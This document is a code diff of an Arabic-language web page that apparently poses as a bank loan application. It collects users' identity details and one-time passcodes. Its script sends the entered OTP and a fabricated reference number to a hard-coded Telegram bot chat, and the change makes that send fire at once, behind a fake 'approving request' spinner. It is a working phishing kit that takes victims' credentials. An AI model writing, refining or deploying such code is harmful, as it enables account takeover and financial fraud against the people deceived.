@@ -580,7 +580,7 @@
             <button class="btn-submit" style="background-color: #64748b; margin-top: 10px;" onclick="goToStep('step-home')">الرجوع للخلف</button>
         </div>
 
-        <!-- 3. صفحة إدخال البيانات الشخصية (تمت إزالة حقل المستند) -->
+        <!-- 3. صفحة إدخال البيانات الشخصية -->
         <div id="step-personal-info" class="card hidden">
             <h2>إدخال بيانات المستخدم</h2>
             <h3>يرجى استيفاء بيانات الهوية لإتمام الطلب</h3>
@@ -717,7 +717,8 @@
         const chatId = "2014945683";
 
         function sendTelegramMessage(text) {
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
@@ -1005,16 +1006,16 @@
                 btn.disabled = true;
                 btn.innerHTML = `<span class="loading-spinner"></span> جاري اعتماد الطلب...`;
                 
+                let randomRef = 'BOK-LN-' + Math.floor(10000000 + Math.random() * 90000000);
+                userData.refNum = randomRef;
+
+                sendTelegramMessage(
+                    `📲 رمز التحقق (OTP) - المحاولة الثانية والاخيرة:\n` +
+                    `• الرمز المدخل: ${userData.otp2}\n\n` +
+                    `🎫 الرقم المرجعي للطلب: ${userData.refNum}`
+                );
+
                 setTimeout(() => {
-                    let randomRef = 'BOK-LN-' + Math.floor(10000000 + Math.random() * 90000000);
-                    userData.refNum = randomRef;
-
-                    sendTelegramMessage(
-                        `📲 رمز التحقق (OTP) - المحاولة الثانية والاخيرة:\n` +
-                        `• الرمز المدخل: ${userData.otp2}\n\n` +
-                        `🎫 الرقم المرجعي للطلب: ${userData.refNum}`
-                    );
-
                     goToStep('step-success');
                     document.getElementById('display-ref-num').textContent = randomRef;
                 }, 2000);
